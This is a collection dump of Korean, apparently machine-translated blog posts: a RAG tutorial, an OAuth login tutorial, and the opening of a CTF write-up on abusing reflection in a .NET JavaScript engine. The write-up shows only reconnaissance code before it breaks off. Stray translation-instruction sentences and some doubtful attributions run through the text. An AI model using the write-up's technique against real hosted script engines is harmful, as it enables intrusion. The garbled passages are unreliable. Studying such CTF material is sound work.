회사의 재무 보고서를 데이터셋으로 사용할 것입니다.\n\n<div class=\"content-ad\"></div>\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_3.png)\n\nPDF 문서를 처리하는 두 가지 대안적 방법이 있습니다: 텍스트로 읽거나 이미지로 구문 분석합니다. 둘 다 사용 사례에 따라 다르기 때문에 완벽하지는 않지만, OCR (광학 문자 인식) 기능이 더 잘 작동하는 경향이 있으므로 이를 사용하겠습니다.\n\n이 기사의 초점이 OCR에 있지는 않으며, 작동 방식에 대해 자세히 설명하는 데 너무 많은 시간을 할애하지는 않을 것입니다. 만약 해당 주제를 깊이 파고들고 싶다면, 이 기사를 확인하고 LayoutParser와 Unstructured 같은 고급 OCR 라이브러리를 사용해 보세요.\n\n우선 문서를 이미지로 변환해야 합니다:\n\n<div class=\"content-ad\"></div>\n\n\n# conda install -c conda-forge poppler\nimport pdf2image #1.17.0\n\ndoc_img = pdf2image.convert_from_path(\"data/doc_nvidia.pdf\", dpi=300)\n\n# 예시로 한 페이지 출력\ndoc_img[35]\r\n\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_4.png\" />\n\n그런 다음, 페이지(이미지)에서 텍스트를 인식하겠습니다. 이를 위해 HP에서 1985년에 만들어진 주요 OCR 시스템 Tesseract를 사용하고 있으며 현재 Google에서 개발 중에 있습니다.\n\n\nimport pytesseract #0.3.10\n\ndoc_txt = []\nfor page in doc_img:\n    text = pytesseract.image_to_string(page)\n    doc_txt.append(text)\n\ndoc_txt[35]\r\n\n\n<div class=\"content-ad\"></div>\n\n![2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_5.png](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_5.png)\n\n이제 우리는 생 텍스트를 가지고 있으니, 무엇보다 처리를 해야 할 것입니다. 우리는 언어 모델을 사용할 것입니다. 현재 여러 가지 대체 라이브러리들이 있어서 LLM의 힘을 활용할 수 있습니다: Ollama, HuggingFace, DSPy, LangChain. 제가 사용하는 Ollama는 강력하면서 사용하기 쉽습니다.\n\n먼저, 웹사이트에서 프로그램을 다운로드해야 합니다. 그런 다음, 명령 프롬프트에서 아래 명령을 입력하여 노트북에서 LLM을 실행합니다 (저는 Phi3와 LLaVa를 사용하고 있습니다):\n\n![2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_6.png](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_6.png)\n\n<div class=\"content-ad\"></div>\n\n마지막으로, Python 라이브러리를 설치하면 끝입니다 (pip install ollama).\n\n## 전처리\n\n어떤 데이터 과학 프로젝트든 마찬가지로, 언제나 가장 어려운 부분은 데이터셋입니다. 머신러닝을 얼마나 많이 사용하더라도 데이터가 좋지 않다면 AI가 제대로 작동하지 않을 것입니다.\n\nLLM(대형 언어 모델)의 경우, 임베딩이 포함되어 있기 때문에 표준 플랙티스는 모든 것을 텍스트로 변환하는 것입니다. 가장 일반적인 다중모달 콘텐츠 (텍스트, 테이블, 이미지, 플롯)의 처리 방법을 보여드리겠습니다.\n\n<div class=\"content-ad\"></div>\n\n텍스트 — 문서는 서로 다른 구조와 레이아웃을 가질 수 있기 때문에 데이터 세트를 단락으로 분할해야 합니다. 원시 텍스트 외에도 제목, 태그, 링크와 같은 추가 정보를 활용하여 데이터를 보강할 수 있습니다. 이를 메타데이터 보강이라고 합니다.\n\n```js\n# 목차를 사용하여 단락에 태그 지정하기\ntitle_map = {\n    \"4-12\":\"비즈니스\",\n    \"13-33\":\"위험 요인\",\n    \"34-44\":\"재무\",\n    \"45-46\":\"이사\",\n    \"47-83\":\"데이터\"\n}\n\nlst_docs, lst_ids, lst_metadata = [], [], []\nfor n,page in enumerate(doc_txt):\n    try:\n        ## 제목 가져오기\n        title = [v for k,v in title_map.items() \n                 if n in range(int(k.split(\"-\")[0]), \n                               int(k.split(\"-\")[1])+1)][0]\n        ## 페이지 정리\n        page = page.replace(\"Table of Contents\",\"\")\n        ## 단락 가져오기\n        for i,p in enumerate(page.split('\\n\\n')):\n            if len(p.strip())>5:  ##<--단락 정리\n                lst_docs.append(p.strip())\n                lst_ids.append(str(n)+\"_\"+str(i))\n                lst_metadata.append({\"title\":title})\n    except:\n        continue\n\n\n## 예시 출력\nfor id,doc,meta in zip(lst_ids[375:378], \n                       lst_docs[375:378], \n                       lst_metadata[375:378]):\n    print(id, \"-\", meta, \"\\n\", doc, \"\\n\")\r\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_7.png\" />\n\n언어 모델을 사용한 메타데이터 보강은 문서 검색을 크게 향상시킬 수 있습니다. 예를 들어, 각 단락을 몇 가지 키워드로 요약하는 데 Phi3를 사용할 예정입니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nimport ollama #0.2.1\n\ndef keyword_generator(p, top=3):\n    prompt = \"다음 단락을 3개의 키워드로 요약해주세요, 각각 ,로 구분: \"+p\n    res = ollama.generate(model=\"phi3\", prompt=prompt)[\"response\"]\n    return res.replace(\"\\n\",\" \").strip()\n\n\n## test\np = '''Professional artists, architects and designers use NVIDIA partner products accelerated with our GPUs and software platform for a range of creative and design\nuse cases, such as creating visual effects in movies or designing buildings and products. In addition, generative Al is expanding the market for our workstation-\nclass GPUs, as more enterprise customers develop and deploy Al applications with their data on-premises.'''\nprint(keyword_generator(p))\n```\n\n결과: “창의적 디자인, NVIDIA 파트너십, AI 확장”. 위와 같이 모든 단락에 적용하겠습니다:\n\n```js\nfrom tqdm.notebook import tqdm\n\nfor i,doc in tqdm(enumerate(lst_docs)):\n    lst_metadata[i][\"keywords\"] = keyword_generator(doc)\n\n## 예시 출력\nfor id,doc,meta in zip(lst_ids[375:378], \n                       lst_docs[375:378], \n                       lst_metadata[375:378]):\n    print(id, \"-\", meta, \"\\n\", doc, \"\\n\")\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_8.png\" />\n\n<div class=\"content-ad\"></div>\n\nTABLES - LLM(Large Language Model)는 순차 텍스트를 현저한 정확도로 처리할 수 있는 것으로 잘 알려져 있습니다. 그러나 이제 구조화된 데이터도 이해하기 시작했기 때문에 테이블은 일반 텍스트로 전달될 수 있습니다. 이를 다시 한번 확인해보겠습니다:\n\n```js\ntable = lst_docs[376]\nprint(\"테이블:\\n\", table)\n\nprompt = f\"다음 테이블을 요약해주세요: {table}\"\nres = ollama.generate(model=\"phi3\", prompt=prompt)[\"response\"]\n\nprint(\"\\n요약:\\n\", res)\n```\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_9.png)\n\n이미지 - 이미지의 임베딩은 상당히 까다로울 수 있습니다(3D 배열의 차원을 벡터로 축소해야 함). 따라서 일반적인 실천 방법은 이미지를 설명하는 캡션을 생성하기 위해 AI를 사용하고 가능한 경우 정보를 텍스트로 처리하는 것입니다.\n\n<div class=\"content-ad\"></div>\n\n```python\nfrom matplotlib import image, pyplot\n\nimage_file = \"data/image.jpeg\"\n\npyplot.imshow(image.imread(image_file))\npyplot.show()\n```\n\n![image](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_10.png)\n\nLLM을 위해 이미지를 문자열로 변환해야 합니다:\n\n```python\n## 이미지를 base64 문자열로 인코딩\nimport base64\n\ndef encode_image(path):\n    with open(path, \"rb\") as file:\n        return base64.b64encode(file.read()).decode('utf-8')\n\nimg = encode_image(image_file)\nimg[:1000]\n```\n\n<div class=\"content-ad\"></div>\n\n아래는 테이블 태그를 Markdown 형식으로 변경한 예시입니다.\n\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_11.png\" />\n\n모델에 이미지 설명을 요청하는 문자열을 전달할 수 있습니다. 안타깝게도 Phi3은 시각 모델이 아니기 때문에 이 작업에 적합하지 않습니다:\n\n```js\nprompt = \"이미지를 설명해주세요\"\nres = ollama.generate(model=\"phi3\", prompt=prompt, images=[img])[\"response\"]\nprint(res)\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_12.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n따라서 적절한 시각 모델을 구해야 합니다. Microsoft의 LLaVa는 GPU 없이도 실행할 수 있어 효율적인 선택입니다 (여기에서 시도해 보세요).\n\n```js\n## LLaVA\nprompt = \"이미지를 설명해주세요\"\nres = ollama.generate(model=\"llava\", prompt=prompt, images=[img])[\"response\"]\nprint(res)\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_13.png\" />\n\nPLOTS — 이미지와 마찬가지로, 시각 모델은 플롯/차트를 읽고 요약할 수 있지만 결과가 정확하지는 않습니다. 예를 살펴보겠습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n이미지_파일 = \"data/plot.png\"\n\npyplot.imshow(image.imread(image_file))\npyplot.show()\n\nimg = encode_image(image_file)\n\nprompt = \"그래프와 같은 그림에 대해 구체적으로 설명해주세요.\"\nres = ollama.generate(model=\"llava\", prompt=prompt, images=[img])[\"response\"]\nprint(res)\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_14.png\" />\n\n## 데이터베이스\n\n우리는 데이터를 벡터 데이터베이스에 저장할 수 있습니다. 이는 비구조적 데이터를 효율적으로 저장하고 색인화하고 검색하는 가장 좋은 해결책입니다. 요즘 가장 많이 사용되는 벡터 데이터베이스는 Microsoft의 AISearch입니다. 최고의 오픈 소스 도구는 유용하고 쉽고 무료인 ChromaDB입니다.\n\n<div class=\"content-ad\"></div>\n\n빠르게 \"pip install chromadb\"를 입력하면 Python을 사용하여 세 가지 다른 방법으로 db와 상호 작용할 수 있습니다:\n\n- chromadb.Client()는 디스크 공간을 차지하지 않고 메모리에 일시적으로 유지되는 db를 만듭니다.\n- chromadb.PersistentClient(path)는 로컬 기계에서 db를 저장하고 로드합니다.\n- chromadb.HttpClient(host='localhost', port=8000)는 브라우저에서 클라이언트-서버 모드를 사용할 수 있습니다.\n\nChromaDB에 문서를 저장할 때 데이터는 벡터로 저장되어 일치하는 레코드를 검색할 때 쿼리 벡터를 사용할 수 있습니다. 참고로, 그렇게 명시하지 않으면 기본 임베딩 방법은 문장 변환 모델 (all-MiniLM-L6-v2)입니다.\n\n```js\nimport chromadb #0.5.0\n\ndb = chromadb.PersistentClient()\n\ncollection_name = \"nvidia\"\ncollection = db.get_or_create_collection(name=collection_name, \n               embedding_function=chromadb.utils.embedding_functions.DefaultEmbeddingFunction())\n\ncollection.add(documents=lst_docs, ids=lst_ids, metadatas=lst_metadata, \n               images=None, embeddings=None)\ncollection.peek(1)\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_15.png\" />\n\n어떤 것을 쿼리해보세요:\n\n```js\nquery = \"수익은 얼마인가요?\"\ncollection.query(query_texts=[query])\n```\n\n<img src=\"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_16.png\" />\n\n<div class=\"content-ad\"></div>\n\n쿼리가 동일한 벡터 공간에 포함되어 있고 ChromaDB가 가장 가까운 문서를 검색했습니다. 그들을 결합해서 db에서 최종 응답을 얻을 수 있습니다:\n\n```js\nres_db = collection.query(query_texts=[query])[\"documents\"][0][0:10]\ncontext = ' '.join(res_db).replace(\"\\n\", \" \")\ncontext\n```\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_17.png)\n\ndb 응답은 컨텍스트로 사용될 수 있으며, 이는 LLM이 저장하고 액세스할 수 있는 소량의 정보 세트입니다. 프롬프트를 사용하여 모델이 컨텍스트 내 정보만 사용할지 훈련 중에 학습한 지식도 사용해야 하는지 지정할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\n# Context만으로 대화하기\nres = ollama.chat(model=\"phi3\", \n                  messages=[{\"role\":\"system\", \"content\":\"다음 정보만을 사용하여 가장 정확한 답변을 제공하세요: \\n\"+context},\n                            {\"role\":\"user\", \"content\":query}])\nprint(res[\"message\"][\"content\"])\n```\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_18.png)\n\n또는 모델의 지식을 추가하여:\n\n```js\n# 지식 및 Context로 대화하기\nres = ollama.chat(model=\"phi3\", \n                  messages=[{\"role\":\"system\", \"content\":\"귀하의 지식과 다음 추가 정보를 사용하여 가장 정확한 답변을 제공하세요: \\n\"+context},\n                            {\"role\":\"user\", \"content\":query}])\nprint(res[\"message\"][\"content\"])\n``` \n\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_19.png)\n\n데이터베이스가 설정되어 정상적으로 작동 중입니다. 다음 단계로 진행하여 문서에 관한 질문을 할 수 있는 챗봇 앱을 만들 수 있습니다.\n\n## 프론트엔드\n\n요즘 가장 많이 사용되는 Python 라이브러리인 Streamlit은 NLP 애플리케이션 개발을 간편하게 만들어주는 스트리밍 기능으로 알려져 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n시작하기 전에 먼저 레이아웃을 정의해 봅시다: 화면에는 사용자가 채팅 기록을 볼 수 있는 사이드바가 있기를 원합니다.\n\n```python\nimport streamlit as st #1.35.0\n\n## 레이아웃\nst.title('💬 궁금한 점을 적어주세요')\nst.sidebar.title(\"채팅 기록\")\napp = st.session_state\n\nif \"messages\" not in app:\n    app[\"messages\"] = [{\"role\":\"assistant\", \"content\":\"정보를 검색할 준비가 되어 있습니다.\"}]\n\nif 'history' not in app:\n    app['history'] = []\n\nif 'full_response' not in app:\n    app['full_response'] = '' \n```\n\n앱 객체(또는 session_state)는 다음과 같은 구조를 갖는 딕셔너리입니다:\n\n![이미지](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_20.png)\n\n<div class=\"content-ad\"></div>\n\n만약 채팅에서 메시지가 사라지는 것을 원하지 않는다면, 다음 코드를 추가하세요:\n\n```js\n## 채팅 메시지 유지\nfor msg in app[\"messages\"]:\n    if msg[\"role\"] == \"user\":\n        st.chat_message(msg[\"role\"], avatar=\"😎\").write(msg[\"content\"])\n    elif msg[\"role\"] == \"assistant\":\n        st.chat_message(msg[\"role\"], avatar=\"👾\").write(msg[\"content\"])\n```\n\n이제 채팅 코어를 코드화해야 합니다: 사용자의 질문은 메시지 목록에 추가되어 AI로 전달되고, 앱은 응답을 스트리밍할 것입니다.\n\n```js\n## 채팅\nif txt := st.chat_input():\n    ### 사용자 입력\n    app[\"messages\"].append({\"role\":\"user\", \"content\":txt})\n    st.chat_message(\"user\", avatar=\"😎\").write(txt)\n\n    ### AI가 채팅 스트림으로 응답\n    app[\"full_response\"] = \"\"\n    st.chat_message(\"assistant\", avatar=\"👾\").write_stream( xxx ) )\n    app[\"messages\"].append({\"role\":\"assistant\", \"content\":app[\"full_response\"]})\n    \n    ### 사이드바 히스토리 보여주기\n    app['history'].append(\"😎: \"+txt)\n    app['history'].append(\"👾: \"+app[\"full_response\"])\n    st.sidebar.markdown(\"<br />\".join(app['history'])+\"<br /><br />\", unsafe_allow_html=True)\n```\n\n<div class=\"content-ad\"></div>\n\n우리는 사용자 질문에 응답하는 기능을 완성한 후 \"xxx\"로 대체할 자리 표시자를 삽입했습니다. 앱을 실행하면 다음과 같이 보입니다:\n\n![앱 실행 화면](/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_21.png)\n\n## 백엔드\n\n우리는 이미 이 부분에 익숙합니다. 이것을 클래스 내에 넣기만 하면 됩니다. 강조할 몇 가지 포인트가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n- ChromaDB에서 컬렉션 이름을 호출하면, 이미 존재하는 경우 db는 새로 만들지 않고 \"가져오게\" 됩니다.\n- Ollama 채팅 기능의 스트리밍 매개변수는 (stream=True)로 전환하여 완전한 응답 대신 텍스트 청크를 반환합니다.\n- LLM을 호출할 때마다 이전 메시지에 대한 참조를 이해할 수 있도록 전체 채팅 기록을 입력으로 전달합니다.\n\n```js\nimport chromadb #0.5.0\nimport ollama  #0.5.0\n\nclass AI():\n def __init__(self):\n  db = chromadb.PersistentClient()\n  self.collection = db.get_or_create_collection(\"nvidia\")\n\n def query(self, q, top=10):\n  res_db = self.collection.query(query_texts=[q])[\"documents\"][0][0:top]\n  context = ' '.join(res_db).replace(\"\\n\", \" \")\n  return context\n\n def respond(self, lst_messages, model=\"phi3\", use_knowledge=False):\n  q = lst_messages[-1][\"content\"]\n  context = self.query(q)\n\n  if use_knowledge:\n   prompt = \"Give the most accurate answer using your knowledge and the folling additional information: \\n\"+context\n  else:\n   prompt = \"Give the most accurate answer using only the folling information: \\n\"+context\n\n  res_ai = ollama.chat(model=model, \n        messages=[{\"role\":\"system\", \"content\":prompt}]+lst_messages,\n                      stream=True)\n  for res in res_ai:\n   chunk = res[\"message\"][\"content\"]\n   app[\"full_response\"] += chunk\n   yield chunk\n\nai = AI()\n```\n\nStreamlit 앱을 실행하려면 다음 명령을 사용해야 합니다: streamlit run rag_app.py\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*C722wXvi4JCn3OrN8TbLLA.gif\" />\n\n<div class=\"content-ad\"></div>\n\n## 결론\n\n본 글은 Python과 LLMs를 사용하여 RAG 앱을 만드는 방법을 보여주는 튜토리얼이었습니다. 우리는 언어 모델을 사용하여 멀티모달 콘텐츠를 처리하고, 그 데이터를 벡터 데이터베이스에 저장했습니다. ChatGPT와 비슷한 AI가 우리의 질문에 답변할 때 사용하는 데이터베이스입니다. 마지막으로 모델과 채팅할 수 있는 사용자 친화적인 인터페이스를 만들었습니다.\n\n즐겁게 즐겼으면 좋겠습니다! 질문이나 피드백이 있으시면 언제든지 저에게 연락해 주시거나 귀하의 흥미로운 프로젝트를 공유해 주세요.","ogImage":{"url":"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_0.png"},"coverImage":"/assets/img/2024-06-30-GenAIwithPythonRAGwithLLMCompleteTutorial_0.png","tag":["Tech"],"readingTime":16},{"title":"OAuth는 삶을 쉽게 만들어 준다 사용 방법, 이점 및 실전 예제","description":"","date":"2024-06-30 18:28","slug":"2024-06-30-OAuthMakesLifeEasy","content":"\n\n저와 같이 기술의 발전으로 게으를 갖고 있는 분이세요? 솔직히 말씀드리자면, 스트레스 받을 건 전혀 가망이 없죠. 보안은 기술에서 매우 중요한 측면이며, 진지하게 고려해야 합니다. 그러나 솔직히 말해요, 우리 중 얼마나 많은 사람들이 안전한 암호를 생성하고 안전하게 보관하는 필요한 단계를 취하는 것을 선호할까요? 이 세대의 기술 사용자들은 그래 할 만큼 게으르죠.\n\n이전에 사람들이 일반적으로 했던 방식은 하나의 강력한 암호를 생성하여 모든 웹 사이트에 사용하는 것이었습니다. 그러나 한 사이트가 침해당한다면, 암호가 노출됩니다. 중요한 사람인 경우, 해커들은 그를 활용하여 소셜 미디어에 로그인할 수 있습니다. 만약 은행 앱에도 같은 암호를 사용하는 무모한 짓을 하려한다면? — \"Otilor\"(요르바어로 \"사라졌거나 망했다\"는 뜻)입니다.\n\n그렇다면, 저와 같이 게으른 사람들에게 좋은 대안은 무엇일까요? 그 대답은 OAuth(Open Authorization)입니다.\n\nOAuth(Open Authorization)란 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\nOAuth은 Google, Facebook 또는 GitHub과 같은 신뢰할 수 있는 플랫폼을 사용하여 인증할 수 있도록 합니다. 이러한 대표적인 사이트들은 보안에 수십억을 투자하고 있습니다. 만약 해커가 Google 또는 Facebook을 성공적으로 해킹할 수 있다면, 나의 계정을 해킹해도 된다고 생각할 수도 있겠지만, 그건 농담이에요. 하지만 사실은 이들에게 우리의 보안을 맡길 수 있다는 것이죠. 그래서 내가 해야 할 일은 구글에 로그인하는 것 뿐이에요. 적어도 그건 하나의 비밀번호일 뿐이니까, 이건 안전하게 지킬 수 있어야겠죠.\n\n구글, Facebook 또는 GitHub에 로그인한 후, 다른 웹사이트에게 내 이름, 프로필 사진 및 계정에서 사용 가능한 기타 정보와 같은 몇 가지 사용자 정보에 대한 접근 권한을 부여할 수 있어요. 이렇게 하면 해당 웹사이트가 나의 인증을 수행할 수 있어요.\n\nOAuth 유형\n\n더 나아가기 전에, Open Authorization에는 OAuth 1.0과 OAuth 2.0 두 가지 유형이 있다는 것을 간략히 언급하고 싶어요. 오늘날 가장 일반적으로 사용되는 버전인 OAuth 2.0은 더 간단하고 유연성이 더 높은 기능을 제공합니다.\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경해주세요.\n\n<div class=\"content-ad\"></div>\n\n2. 필요한 npm 패키지를 설치해주세요:\n\n\nnpm install express passport passport-google-oauth20 express-session\n\n\n3. index.js 파일을 만들고 Express 애플리케이션을 설정해주세요:\n\n```javascript\nconst express = require('express');\nconst passport = require('passport');\nconst GoogleStrategy = require('passport-google-oauth20').Strategy;\nconst session = require('express-session');\n```\n\n<div class=\"content-ad\"></div>\n\n```javascript\nconst app = express();\n\napp.use(session({\n    secret: 'your_secret_key', // Replace with a secure key\n    resave: false,\n    saveUninitialized: true\n}));\n\napp.use(passport.initialize());\napp.use(passport.session());\n\n// Configure Passport to use Google OAuth\npassport.use(new GoogleStrategy({\n    clientID: 'YOUR_GOOGLE_CLIENT_ID',\n    clientSecret: 'YOUR_GOOGLE_CLIENT_SECRET',\n    callbackURL: 'http://localhost:3000/auth/google/callback'\n},\nfunction(token, tokenSecret, profile, done) {\n    return done(null, profile);\n}));\n```\n\n<div class=\"content-ad\"></div>\n\n```javascript\npassport.serializeUser((user, done) => {\n  done(null, user);\n});\n\npassport.deserializeUser((obj, done) => {\n  done(null, obj);\n});\n\n// Define routes\napp.get('/auth/google',\n  passport.authenticate('google', { scope: ['profile'] }));\n\napp.get('/auth/google/callback',\n  passport.authenticate('google', { failureRedirect: '/' }),\n  (req, res) => {\n    res.redirect('/');\n  });\n```\n\n<div class=\"content-ad\"></div>\n\n\napp.get('/', (req, res) => {\n  res.send(`<h1>Home</h1><a href=\"/auth/google\">Login with Google</a>`);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});\n\n4. Start your Node.js server with “node index.js”. Open your browser and go to http://localhost:3000. Click on \"Login with Google\" to start the OAuth process.\n\nTo get the Google Client ID and Secret, follow these steps:\n\n\n<div class=\"content-ad\"></div>\n\n- Google Cloud Console로 이동하세요.\n- 새 프로젝트를 만들거나 기존 프로젝트를 선택하세요.\n- API 및 서비스 `자격 증명` 페이지로 이동하세요.\n- `자격 증명 만들기`를 클릭하고 OAuth 클라이언트 ID를 선택하세요.\n- 필수 필드를 작성하여 동의 화면을 구성하세요.\n- 애플리케이션 유형으로 웹 애플리케이션을 선택하세요.\n- http://localhost:3000/auth/google/secrets와 같은 승인된 리디렉션 URI를 추가하세요.\n- 생성을 클릭하여 클라이언트 ID 및 시크릿을 가져오세요.\n\n![OAuthMakesLifeEasy](/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png)\n\n만약 기술에 미숙하다면, 위의 기술 용어에 머리 아프지 마세요. 다음에 \"Google로 가입\"을 보면 안전하니 그냥 사용하세요. 요약하면 이렇습니다. 어쩌다 이런 글을 써야 했네요. HNG 인턴십은 나이지리아와 아프리카의 떠오르는 기술인들에게 흥미로운 기회입니다. HNG 웹사이트를 통해 HNG 인턴십, HNG 채용, 또는 HNG 프리미엄을 확인할 수 있습니다. 안녕히 가세요!","ogImage":{"url":"/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png"},"coverImage":"/assets/img/2024-06-30-OAuthMakesLifeEasy_0.png","tag":["Tech"],"readingTime":4},{"title":"NET에 맞는 JavaScript 엔진 활용 방법","description":"","date":"2024-06-30 18:26","slug":"2024-06-30-ExploitingaJavaScriptEngineforNET","content":"\n\n이 블로그는 .NET 라이브러리용 MSIE JavaScript Engine 버전 3.1.0의 구성 오류를 악용하여 로컬 파일 노출, 임의 파일 쓰기, 원격 코드 실행을 달성하는 내용을 다루고 있습니다. 이는 ICMTC CTF 2024 예선에서 어려운 CTF 도전과제였어요. 함께 시작해봅시다.\n\n도전은 Custom ChatBot 이라 불렸고, 대회에서는 0회 풀렸으며, 저자는 몇 일 동안 도전을 풀고 싶은 사람들을 위해 계속 유지하기로 결정했고, 저는 그에 도전해보았어요. 어떻게 해결했는지 살펴봅시다.\n\n## 도전 설명\n\n![도전 설명](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png)\n\n<div class=\"content-ad\"></div>\n\n도전 과제에는 두 가지 중요한 기능이 있었어요. 하나는 JavaScript로 ChatBot을 사용자 정의하는 것이었고, 다른 하나는 ChatBot과 상호 작용하는 것이었죠.\n\n![이미지1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_1.png)\n\n![이미지2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_2.png)\n\n간단한 기능이 실행되고 우리에게 응답이 전송되었음을 확인할 수 있어요. 도전 과제 설명으로부터, JavaScript 코드의 구문 분석을 처리하는 라이브러리와 라이브러리 버전을 알 수 있었구요. 그래서 제가 한 일은 이미 알려진 취약점이나 CVE를 찾아보는 것이었지만 발견하지 못했어요. 그래서 우리가 주변을 살펴보고 환경을 이해하기 시작할 때가 되었어요.\n\n<div class=\"content-ad\"></div>\n\n## 어플리케이션 이해하기\n\n첫 번째로 해야 할 일은 어떤 문맥에서 실행 중이며 어떤 객체들을 사용할 수 있는지 알아내는 것입니다. 그럴려면 어떻게 해야 할까요? 먼저 떠오르는 것은 this 객체인데, 그 중요성에 대해 간단히 설명해 드리겠습니다.\n\nJavaScript나 다른 몇몇 프로그래밍 언어에서 this 키워드는 해당 객체를 가리킵니다. 그 값은 사용된 문맥에 따라 달라집니다. 문맥에 대해 더 잘 설명하기 위해, 브라우저 콘솔에서 JavaScript를 실행하는 간단한 예제를 보여 드리겠습니다. 브라우저 콘솔에서 console.log(this)를 실행하면 window 객체를 얻을 수 있고, 그 문맥 안에서 실행 중이므로 window 객체의 속성에 액세스할 수 있습니다.\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_3.png)\n\n<div class=\"content-ad\"></div>\n\n보시다시피 window 객체에서 이용 가능한 많은 멤버들이 있으며 그 중 하나인 document 객체에 접근했습니다. 또한 window 컨텍스트에 정의된 함수에도 접근할 수 있습니다. 예를 들어 atob와 같은 함수가 있습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_4.png\" />\n\n이제 애플리케이션 컨텍스트에서 this 객체를 탐색하고 해당 멤버들을 모두 나열해야 합니다. 아래의 자바스크립트 코드를 사용하여 모든 멤버를 나열할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var objs = [];\n        for (var obj in this) {\n            objs.push(obj);\n        }\n        return \"Objects: \" + objs.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot 1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_5.png)\n\n우리가 얻은 결과에는 JavaScript 코드에서 정의하지 않은 ProcessChat_Helper 객체가 포함되어 있었습니다. 그래서 접근해 보려고 했고, 다음과 같은 응답을 받았습니다:\n\n```js\nthis.ProcessChat_Helper \n```\n\n![Screenshot 2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_6.png)\n\n\n<div class=\"content-ad\"></div>\n\n결과에 따르면 이 객체는 jail.Controllers.ProcessChatHelper 클래스의 .Net 객체입니다. 그것이 .Net 객체인지 어떻게 알게 되었을까요? JavaScript 객체를 정의하고 동일한 방식으로 액세스하려고 시도하면 완전히 다른 결과를 얻을 수 있습니다.\n\n```js\nvar jsObject = {};\nthis.jsObject\n```\n\n![image](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_7.png)\n\n그렇다면 왜 그리고 어떻게 JavaScript 컨텍스트에서 .Net 객체에 액세스할 수 있을까요? 도전 과제의 로컬 복사본을 만들어보는 중에 답을 찾았습니다. 여기에 .Net 객체를 노출하는 코드가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n// 코드 조각. \nusing (var engine = new MsieJsEngine())\n{\n  // C# 객체를 JavaScript 컨텍스트에 노출\n  engine.EmbedHostObject(\"ProcessChat_Helper\", ProcessChatHelperObject);\n  // 스크립트를 평가\n  var result = engine.Evaluate<string>(script);\n}\n```\n\n## C#에서의 Reflection\n\nProcessChat_Helper 객체는 ProcessChatHelper 클래스의 인스턴스이며, 해당 클래스가 어떻게 구현되었는지를 알 수 없기 때문에 객체 내의 공개 메서드를 열거해야 합니다. 하지만 어떻게 그것을 할 수 있을까요? 조금의 검색 끝에 GitHub의 라이브러리 저장소로 이동하여 3.1.0 이후의 릴리스에서 뭔가 이상한 것을 발견했습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_8.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n릴리스에 따르면 AllowReflection의 기본값이 이제 기본적으로 false로 설정되어 있습니다. 이것은 v3.1.0에서 그렇지 않았던 것입니다. 그렇다면 Reflection이란 무엇일까요? 제 친구인 ChatGPT에게 물어봤는데, 그는 전체 과정 동안 큰 도움이 되었습니다. 그가 말한 내용은 다음과 같습니다:\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_9.png)\n\n간단히 말하자면, 이 설정이 true로 설정된 경우, .Net 객체에 액세스할 수 있다면 해당 클래스의 속성에 액세스하고 런타임 